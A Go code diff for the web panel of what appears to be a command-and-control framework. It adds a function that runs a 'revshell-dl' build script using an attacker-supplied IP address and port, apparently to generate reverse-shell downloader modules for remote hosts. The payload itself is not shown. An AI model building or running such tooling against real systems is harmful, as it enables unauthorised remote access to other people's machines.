@@ -2,10 +2,13 @@ package httpui
 
 import (
 	"log"
+	"os"
+	"os/exec"
 	"fmt"
 	"net/http"
 	"github.com/gorilla/mux"
 	"html/template"
+	"strconv"
 
 	"desukit/sqldb/view"
 	"desukit/sqldb/model"
@@ -14,6 +17,7 @@ import (
 )
 
 var templates *template.Template
+
 
 func Start() {
 	port := "8080"
@@ -32,8 +36,8 @@ func Start() {
 
 	// Generated payloads will be placed in this directory and can be used to
 	// push modules and client payloads to remote hosts
-	pullServer := http.FileServer(http.Dir("./httpui/payload"))
-	r.PathPrefix("/checkout/").Handler(http.StripPrefix("/checkout/", pullServer))
+	//pullServer := http.FileServer(http.Dir("./httpui/payload"))
+	//r.PathPrefix("/checkout/").Handler(http.StripPrefix("/checkout/", pullServer))
 
 	done := make(chan bool)
 	fmt.Println("Starting HTTP server at port 8080")
@@ -41,12 +45,32 @@ func Start() {
 	<-done
 }
 // Helper functions
-func createTask(uuid string, task_name string) {
-	var task_id int
-	switch task_name {
-	case "shell":
-		task_id = 1
+// buildModule() will eventually be moved to a separate package
+// potentailly a full build API?
+func buildModule(uuid string, task_id int, ipaddr string, port string) {
+	//uuid will be used in filename 
+	switch task_id {
+	case 1:
+		build_script := "task_modules/revshell-dl/buildmodule.sh"
+
+		fmt.Println(ipaddr, port)
+		cmd := exec.Command(build_script, ipaddr, port, "task_modules/revshell-dl")
+		cmd.Stdin = os.Stdin
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+
+		err := cmd.Run()
+
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+
+		fmt.Println("module built")
 	}
+} 
+
+func createTask(uuid string, task_id int) {
 	// fill Task struct with garbage, won't actually be submitted right now
 	task_queued := 1
 	queue := 1
@@ -72,7 +96,10 @@ func taskHandler(w http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	uuid := vars["uuid"]
 	r.ParseForm()
-	task_name := r.Form["task"][0]
-	createTask(uuid, task_name)
-	httpHandler(w, r)
+	task_id, _ := strconv.Atoi(r.Form["task_id"][0])
+	ipaddr := r.Form["ipaddr"][0]
+	port := r.Form["port"][0]
+	buildModule(uuid, task_id, ipaddr, port)
+	createTask(uuid, task_id)
+	http.Redirect(w, r, r.Header.Get("Referer"), 302)
 }
